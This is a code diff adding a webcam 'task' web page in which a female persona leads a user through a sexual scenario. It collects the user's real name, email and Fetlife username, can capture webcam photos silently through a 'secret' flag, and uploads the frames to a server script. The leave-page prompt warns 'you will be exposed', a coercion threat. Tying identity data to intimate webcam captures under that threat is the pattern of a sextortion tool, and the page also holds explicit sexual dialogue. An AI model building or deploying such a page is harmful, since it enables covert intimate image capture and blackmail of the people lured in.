@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<head>
+
+
+<link rel="stylesheet" type="text/css" href="style.css">
+<script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
+<script src="speech.js"></script>
+
+<script type="text/javascript">
+/* Image Attr */
+   var brightness = 51;
+   var contrast = 51;
+   function getImageAttr(acanvas) {
+          var colorSum = 0;
+          var cMin = 255;
+          var cMax = 0;
+
+            var ctx = acanvas.getContext("2d");
+            ctx.drawImage(acanvas,0,0);
+
+            var imageData = ctx.getImageData(0,0,acanvas.width,acanvas.height);
+            var data = imageData.data;
+            var r,g,b,avg;
+
+              for(var x = 0, len = data.length; x < len; x+=4) {
+                r = data[x];
+                g = data[x+1];
+                b = data[x+2];
+
+                avg = Math.floor((r+g+b)/3);
+				if (cMin > avg)
+				  cMin = avg;
+				if (cMax < avg)
+				  cMax = avg;
+                colorSum += avg;
+            }
+            contrast = cMax-cMin;
+            brightness = Math.floor(colorSum / (acanvas.width*acanvas.height));
+    }
+
+/*
+  Script for main task
+*/
+var ended = false;
+function exittask() {
+  if (ended == false) {
+    return "Are you sure you want to leave this page? if you leave early you will be exposed!";
+  }
+}
+
+function addlog(ltext){
+  var logtext = ltext;
+  document.getElementById('logmsg').value = logtext;
+  var fd2 = new FormData(document.forms["form2"]);
+  console.info("normally now we would send stuff to jenniffer:", fd2);
+}
+
+//script code
+var cline = 0;
+var msgtext = "";
+// User values
+var level = 0;
+var real_name = "";
+var user_email = "";
+
+
+
+
+function runtask(){
+
+	if (window.currentRecognition) {
+		window.currentRecognition.stop();
+		window.currentRecognition = undefined;
+	}
+
+  // Process Values
+  switch (cline) {
+    case 0: level = 1;
+	        break;
+    case 2: real_name = document.getElementById("username").value;
+	        user_email = document.getElementById("useremail").value;
+			fetlife = document.getElementById("fetlife").value;
+			referred = document.getElementById("referred").value;
+			
+			if ((real_name == "") || (user_email == "")) {
+				two.innerHTML = ""
+				three.innerHTML = ""
+			  	say("Well thats an interesting name and email address. Think we will have to try again.", () => setTimeout(runtask, 2000));
+				cline = 1; // actually two but it is incremented
+				return;
+            }
+	        break;
+  }
+  cline++;
+  three.innerHTML = ""; // clear buttons
+  switch (cline) {
+      case 1:
+	      if (workingcam) {
+			one.src="lib_image/jen1.jpg";
+			two.innerHTML = "";
+			say("Well hello there, It's nice to meet you, what do you think we should do?", () => setTimeout(runtask, 1000));
+            
+			
+          } else {
+			two.innerHTML = "Ohh you failed at the first step! I can't see your camera.. try looking at the FAQ for more help.";
+			cline = 180;
+          }			  
+	      break;
+      case 2:
+//	      one.src="lib_image/01.jpg";  
+	      
+		  say("But before we get started I think it would be nice to know a litle about you? Please say 'i am ready' when you have entered your details.",
+		  	() => repeatAfterMe("I am ready", runtask, () => say('I could not understand you. Please say "i am ready" when you are ready.')));
+ 	      three.innerHTML = "Name: <input type=\"text\" name=\"msg\" id=\"username\" size=\"20\"><br>Email: <input type=\"email\" name=\"msg\" id=\"useremail\" size=\"40\"><br>Fetlife username (if have one): <input type=\"text\" name=\"msg\" id=\"fetlife\" size=\"20\"><br>Referred by (if anyone): <input type=\"text\" name=\"msg\" id=\"referred\" size=\"20\">";
+	      break;
+      case 3:
+one.src="lib_image/jen2.jpg";
+
+		say("Ok "+real_name+",You look like you have a bulge in your trousers already and we haven't even got started. Shall we play a little game of you show me yours and then I will show you mine? and then we may have a little play after that");
+		say("When you are ready say 'Yes, sounds fun'", () => repeatAfterMe('yes sounds fun', runtask, () => say("I could not understand you, please repeat")));
+		  
+		   addlog("Level:" + level);
+	      addlog("Name:" + real_name);
+	      addlog("Fetlife:" + fetlife);
+	      addlog("Referred:" + referred);		  
+			addlog("Sex:Male");addlog("Orientation:Heterosexual");		  
+			send_photo();
+		  break;
+      case 4:
+one.src="lib_image/jen3.jpg";
+	      two.innerHTML = "";
+		  say("Lets get you naked first, " + real_name + " - don't worry I will look away till you're nice and aroused ...");
+          setTimeout("runtask()",(7*1000));		  
+	      break;		  
+
+      case 5:
+	  	say("Say 'Naked' when you are ready.", () => repeatAfterMe('naked', () => say("Okay, this was just a demo. We won't continue here."), () => say("please say naked!")));
+		break;		  
+	  
+	}
+}
+</script>
+</head>
+
+<body onbeforeunload="return exittask()">
+
+	<audio src="camera_click.ogg" preload="auto" id="camera_click"></audio>
+	<audio src="siri_start.ogg" preload="auto" id="siri_start"></audio>
+	<audio src="siri_end.ogg" preload="auto" id="siri_end"></audio>
+
+	<img id="one" src="lib_image/jen1.jpg"width="100%" />
+<div id="mtext">
+<div id="messagebox">
+<p  id="two" >Loading task...</p>
+</div>
+<br>
+<form>
+<p id="three" >&nbsp;</p>
+<img src="microphone.svg" id="mic" />
+
+<!-- <button style="height:50px;" onclick="runtask();">restart script</button> -->
+</form>
+
+<form method="post" accept-charset="utf-8" name="form2">
+<input name="id" value="2Z7791161"  type="hidden"/>
+ <input name="msg" id='logmsg' type="hidden"/>
+</form>
+</div>
+<!-- Video capture - should hide? -->
+<div id="container">
+    <video autoplay="true" playsinline id="videoElement">
+    </video>
+<label for="videoSource">Source: </label><select id="videoSource"></select>
+<canvas style="visibility: hidden;" id="canvas" width="640" height="480"></canvas>	
+			
+<form method="post" accept-charset="utf-8" name="form1">
+<input name="id" value="2Z7791161"  type="hidden"/>
+ <input name="hidden_data" id='hidden_data' type="hidden"/>
+</form>
+		
+</div>
+<script>
+var workingcam = true;
+var reallyWorkingcam = true;
+var workingmic = true;
+var video = document.querySelector("#videoElement");
+var videoSelect = document.querySelector('select#videoSource');
+ 
+navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia || navigator.oGetUserMedia;
+ 
+if (navigator.getUserMedia) {       
+    navigator.getUserMedia({video: true}, handleVideo, videoError);
+    navigator.getUserMedia({audio: true}, handleAudio, audioError);
+}
+ 
+
+function handleAudio(stream) {
+
+}
+
+function handleVideo(stream) {
+	if (video.src) {
+		URL.revokeObjectURL(video.src); // trying to be clean
+	}
+	try  {
+		video.src = window.URL.createObjectURL(stream);
+	} catch(e){
+		video.srcObject = stream;
+	}
+	
+	// the filling of the select is only done if the select is empty
+	if (navigator.mediaDevices  && navigator.mediaDevices.enumerateDevices && videoSelect.length === 0) {
+		navigator.mediaDevices.enumerateDevices()
+		.then(function (deviceInfos) {
+			// getting the information of the live camera to have it selected in the select
+			var videoTracksList = stream.getVideoTracks(),
+				liveLabel;
+			for (var i = 0; i < videoTracksList.length; i++) {
+				var videoTrack = videoTracksList[i];
+				if (videoTrack.readyState == 'live') {
+					liveLabel = videoTrack.label;
+					break;
+				}
+			}
+			
+			// filling the select
+			for (var i = 0; i !== deviceInfos.length; ++i) {
+				var deviceInfo = deviceInfos[i];
+				var option = document.createElement('option');
+				option.value = deviceInfo.deviceId;
+			
+				if (deviceInfo.kind === 'videoinput') {
+					option.text = deviceInfo.label || 'camera ' + (videoSelect.length + 1);
+					if (deviceInfo.label == liveLabel)
+						option.selected = 'selected';
+					videoSelect.appendChild(option);
+				}
+			}
+			
+			// having the select react to change now
+			videoSelect.onchange = function() {
+				if (stream) {
+					stream.getTracks().forEach(function(track) {
+						track.stop();
+					});
+				}
+				var videoSource = videoSelect.value;
+				var constraints = {
+					audio: false,
+					video: {deviceId: videoSource ? {exact: videoSource} : undefined}
+				};
+				navigator.getUserMedia(constraints,handleVideo,videoError);
+			};
+		})
+		.catch(handleError);
+	}
+}
+ 
+function videoError(e) {
+	console.info('video error');
+	reallyWorkingcam = false;
+}
+
+function audioError(e) {
+	console.info('audio error', e);
+	workingmic = false;
+}
+
+function send_photo(secret) {
+
+	if (!secret) {
+		document.getElementById("camera_click").play();
+		document.getElementById("one").classList.add("shutterClick");
+  		setTimeout(() => document.getElementById("one").classList.remove('shutterClick'), 900);
+	}
+
+
+  if (reallyWorkingcam) {
+    var canvas = document.getElementById("canvas"),
+    context = canvas.getContext("2d");
+    context.drawImage(video, 0, 0, 640, 480);
+	getImageAttr(canvas);
+	
+	if ((brightness > 50) && (contrast > 50)) {
+//    var dataURL = canvas.toDataURL('image/jpeg', 0.9);   
+	  var dataURL = canvas.toDataURL("image/png");
+      document.getElementById('hidden_data').value = dataURL;
+      var fd = new FormData(document.forms["form1"]);
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', 'jen_pic.php', true);
+                xhr.upload.onprogress = function(e) {				
+                };  
+      xhr.onload = function() {
+        var u_image = xhr.responseText;
+	    one.src = u_image;
+      };
+      xhr.send(fd);
+	}
+  }
+}
+
+</script>
+
+<script>
+// Start script
+window.onload = function() {
+    runtask();
+};
+</script>
+
+
+
+</body>
+
+</html>
